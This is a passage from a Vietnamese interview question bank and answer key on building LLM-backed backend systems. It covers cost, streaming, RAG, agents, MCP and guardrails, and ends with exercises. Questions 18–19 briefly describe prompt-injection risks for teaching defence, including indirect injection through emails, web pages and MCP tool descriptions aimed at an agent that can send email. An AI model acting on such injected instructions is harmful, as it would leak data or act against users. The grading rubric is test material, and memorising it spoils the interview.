- Ý phải có: token input và output, output đắt hơn; lịch sử hội thoại gửi lại mỗi lượt
- Điểm cộng: reasoning token tính như output; prompt caching và batch giảm giá

**3. Vì sao phải validate output của LLM?** (1.4)
- Ý phải có: không tất định, có thể bịa, có thể bị injection điều khiển; coi như input không tin cậy
- Điểm cộng: validate cả nghiệp vụ; output render ra HTML/SQL/shell là lỗ hổng
- Red flag: "đã bật JSON mode nên không cần validate"

**4. Tool calling hoạt động thế nào? Ai thực thi tool?** (1.3)
- Ý phải có: model trả yêu cầu gọi tool kèm tham số; backend quyết định và thực thi; gửi kết quả lại
- Điểm cộng: đây là chỗ kiểm quyền; tách tool đọc và ghi

**5. Response trả HTTP 200 nhưng JSON bị thiếu ngoặc đóng. Chuyện gì xảy ra?** (1.2)
- Ý phải có: chạm `max_tokens`, output bị cắt; phải kiểm stop reason trước khi parse
- Điểm cộng: reasoning token ăn vào giới hạn output; xử lý bằng tăng giới hạn, viết tiếp hoặc báo lỗi

### 🟡 Mid

**6. Thiết kế retry và fallback cho lời gọi LLM thế nào? Lỗi nào không nên retry?** (1.2, 2.4)
- Ý phải có: retry timeout/429/5xx có backoff + jitter, `Retry-After`; không retry 400, auth, vượt context, bị từ chối nội dung; fallback sang model phụ hoặc tắt tính năng
- Điểm cộng: retry của SDK + app + queue nhân nhau; fallback phải được eval; circuit breaker

**7. Streaming qua SSE hoạt động thế nào? Vì sao lên server thì stream ra một cục?** (2.1, 2.2)
- Ý phải có: `text/event-stream`, gửi từng event; proxy buffer (Nginx), output buffering của PHP, gzip
- Điểm cộng: `X-Accel-Buffering: no`, `fastcgi_buffering off`; huỷ request tới provider khi client ngắt; mỗi stream giữ một FPM worker

**8. Tính năng tóm tắt tài liệu làm PHP-FPM hết worker giờ cao điểm. Sửa thế nào?** (2.2)
- Ý phải có: chuyển sang queue job, trả job id; giới hạn đồng thời tới provider
- Điểm cộng: cache theo hash tài liệu; job idempotent để retry không trả tiền hai lần; broadcasting hoặc poll để trả kết quả
- Red flag: tăng `pm.max_children` lên gấp năm

**9. Làm sao kiểm soát chi phí khi dùng LLM?** (2.3)
- Ý phải có: đo theo feature/tenant; quota; model nhỏ cho việc dễ; giới hạn output; cắt lịch sử; cache
- Điểm cộng: prompt caching có ngưỡng tối thiểu và cần sắp xếp prompt; batch API; giới hạn bước của agent

**10. Prompt caching là gì? Vì sao bật rồi mà hoá đơn không giảm?** (2.3)
- Ý phải có: cache tiền tố giống hệt nhau; phần cố định lên đầu
- Điểm cộng: prompt dưới ngưỡng tối thiểu; provider cần đánh dấu tường minh mà chưa đánh dấu; timestamp hoặc thứ tự tool đổi ở đầu prompt; TTL ngắn mà traffic thưa; kiểm bằng field usage

**11. RAG là gì, vì sao dùng RAG thay vì đưa toàn bộ dữ liệu vào prompt hay fine-tune?** (2.5)
- Ý phải có: tìm đoạn liên quan rồi đưa vào prompt; context giới hạn, chi phí, dữ liệu đổi, trích dẫn, lọc quyền
- Điểm cộng: fine-tune không xoá được dữ liệu và không lọc quyền theo tài liệu

**12. Chunking ảnh hưởng chất lượng thế nào?** (2.5)
- Ý phải có: to quá thì nhiễu, nhỏ quá thì mất ngữ cảnh; chia theo cấu trúc, overlap
- Điểm cộng: trích text từ PDF/bảng là nơi hỏng đầu tiên; contextual retrieval

**13. pgvector hay vector DB riêng? Hệ thống đang dùng MySQL thì sao?** (2.5)
- Ý phải có: quy mô vừa và đã có Postgres thì pgvector: một nơi lưu, lọc bằng SQL, transaction chung; hệ riêng khi đo thấy giới hạn
- Điểm cộng: MySQL 8.4 không có vector, phải thêm một hệ thống và lo đồng bộ; OpenSearch nếu cần cả full-text

**14. Workflow cố định hay agent: chọn thế nào?** (2.7)
- Ý phải có: workflow khi bước biết trước; agent khi thật sự không biết trước; workflow dễ test và rẻ hơn
- Điểm cộng: giới hạn bước, thời gian, chi phí; human-in-the-loop cho hành động ghi

**15. MCP là gì? Khi nào backend của bạn nên có MCP server?** (2.8)
- Ý phải có: chuẩn mở kết nối ứng dụng LLM với tool, resource, prompt; server cung cấp, client dùng
- Điểm cộng: mở API cho agent nội bộ hoặc đối tác; cùng authz/rate limit như API; rủi ro tool poisoning và server bên thứ ba
- Red flag: "MCP thay cho REST API"

**16. Log prompt và response có vấn đề gì?** (2.9)
- Ý phải có: chứa PII và dữ liệu nhạy cảm; che trước khi log, giới hạn quyền xem, retention
- Điểm cộng: lấy mẫu; log đủ model, version prompt, token, stop reason để debug

**17. LLM gateway là gì? Khi nào cần?** (2.4)
- Ý phải có: lớp trung gian cho mọi lời gọi LLM: routing, fallback, quota, giữ key, log, tính chi phí
- Điểm cộng: gateway thành SPOF, cần HA; che PII và guardrail tập trung; khi nhiều team cùng dùng thì mới đáng

### 🔴 Senior

**18. Chống prompt injection thế nào?** (3.1)
- Ý phải có: không chặn tuyệt đối bằng prompt; giới hạn ở kiến trúc: tool quyền tối thiểu theo user, hành động nguy hiểm cần duyệt, lọc quyền ở retrieval
- Điểm cộng: lethal trifecta và cắt một chân; injection gián tiếp qua email, web, mô tả tool MCP
- Red flag: "thêm vào system prompt: không làm theo chỉ dẫn của user"

**19. Agent đọc email khách hàng và có tool gửi email. Rủi ro gì?** (3.1, 2.7)
- Ý phải có: injection gián tiếp qua email; đủ cả ba chân của trifecta
- Điểm cộng: gửi email cần người duyệt hoặc chỉ gửi tới địa chỉ trong thread; giới hạn bước; log tool call

**20. Chatbot nội bộ trả lời bằng nội dung tài liệu phòng nhân sự cho nhân viên không có quyền.** (3.2)
- Ý phải có: lọc ACL tại retrieval; đồng bộ quyền vào metadata; coi là sự cố bảo mật
- Điểm cộng: rà cache dùng chung và lịch sử hội thoại; audit log để biết ai đã xem gì; filter bắt buộc ở lớp truy cập dữ liệu

**21. Đảm bảo user không truy xuất được tài liệu họ không có quyền trong RAG thế nào?** (3.2, 3.5)
- Ý phải có: filter ACL/tenant trong câu truy vấn vector, không lọc bằng lời dặn model
- Điểm cộng: vấn đề lọc sau ANN trả quá ít kết quả; tách index theo tenant; đồng bộ khi quyền đổi

**22. Đánh giá chất lượng một hệ thống RAG thế nào? Regression khi đổi prompt?** (3.4)
- Ý phải có: tách retrieval và generation; bộ câu hỏi có đáp án; chạy lại khi đổi prompt/model/chunking
- Điểm cộng: LLM-as-judge phải được hiệu chỉnh với người chấm; đưa ca hỏng production vào eval set

**23. Thiết kế guardrail cho chatbot hỗ trợ khách hàng.** (3.3)
- Ý phải có: kiểm input và output; moderation, phân loại, rule; refusal có nhánh riêng
- Điểm cộng: latency và false positive; streaming làm kiểm output khó; guardrail không thay quyền tối thiểu

**24. HNSW là gì, đánh đổi gì so với tìm chính xác?** (3.5)
- Ý phải có: đồ thị nhiều tầng, ANN; nhanh, recall cao nhưng không tuyệt đối; tốn RAM
- Điểm cộng: tham số `ef_search`; so với IVF; filter làm giảm kết quả

**25. Vì sao cần hybrid search? Gộp điểm BM25 và vector thế nào?** (2.6)
- Ý phải có: vector kém với mã, tên riêng, từ hiếm; RRF gộp theo thứ hạng vì điểm không cùng thang
- Điểm cộng: rerank bằng cross-encoder; đo recall trước và sau

**26. Hoá đơn LLM tháng này gấp ba tháng trước.** (2.3, 2.9)
- Ý phải có: xem chi phí theo feature/tenant; tìm vòng lặp retry hoặc agent không giới hạn bước
- Điểm cộng: reasoning bật ở chỗ không cần; cache không còn trúng sau một lần đổi prompt; lịch sử không cắt; RAG nhồi nhiều chunk; áp quota và cảnh báo

**27. Provider chính bị sự cố một giờ. Hệ thống của bạn hành xử thế nào?** (2.4)
- Ý phải có: circuit breaker, chuyển sang provider/model phụ đã eval, hoặc tắt tính năng AI và giữ luồng chính
- Điểm cộng: job trong queue chờ và chạy lại sau; thông báo trạng thái cho user; quota của provider phụ có đủ không

**28. Đổi sang model embedding mới thế nào?** (2.6)
- Ý phải có: embed lại toàn bộ vào index mới song song, so trên eval set, chuyển rồi xoá index cũ
- Điểm cộng: tính chi phí và thời gian embed lại trước; ghi phiên bản model cạnh vector

**29. Dùng agent cho quy trình hoàn tiền?** (2.7)
- Ý phải có: workflow cố định, LLM chỉ phân loại và soạn đề xuất; hoàn tiền cần người duyệt
- Điểm cộng: tool có idempotency key, giới hạn số tiền, audit log
- Red flag: "cho agent gọi API hoàn tiền"

---

## Bài tập tự làm

1. Vẽ sơ đồ luồng cho tính năng "hỏi đáp tài liệu nội bộ" gồm ingest, cập nhật khi tài liệu sửa/xoá/đổi quyền, và lọc quyền tại retrieval. Chỉ ra ba điểm có thể rò rỉ dữ liệu.
2. Viết interface adapter (Go, Java hoặc PHP) cho lời gọi LLM có timeout, retry, fallback, xử lý stop reason và ghi token/chi phí (kể cả token cache và reasoning). Chỉ cần interface và mô tả hành vi, không cần gọi provider thật.
3. Liệt kê 10 câu hỏi cho eval set của một chatbot hỗ trợ khách hàng, kèm tiêu chí chấm cho mỗi câu. Ít nhất 2 câu là prompt injection.
4. Với một agent có tool `search_orders`, `refund_order`, `send_email`, mô tả các giới hạn và kiểm soát bạn đặt cho từng tool, và chỉ ra agent này có đủ ba chân của lethal trifecta không.
5. So sánh pgvector với một vector DB riêng cho hệ thống 1 triệu chunk, 50 tenant, DB chính là MySQL 8.4: nêu tiêu chí và điều kiện khiến bạn đổi lựa chọn.
6. **PHP/Laravel.** Trong một project Laravel:
   - Viết route stream câu trả lời từ một provider (SDK chính thức hoặc HTTP client) qua Nginx + PHP-FPM. Chứng minh chữ hiện dần; bỏ header `X-Accel-Buffering: no` và ghi lại khác biệt.
   - Chuyển cùng tính năng sang queue job idempotent: trả job id, lưu kết quả, retry không gọi provider lần hai.
   - Ngắt kết nối trình duyệt giữa chừng và kiểm tra code của bạn có dừng đọc stream từ provider không.

> Nộp bài vào đây để được review.
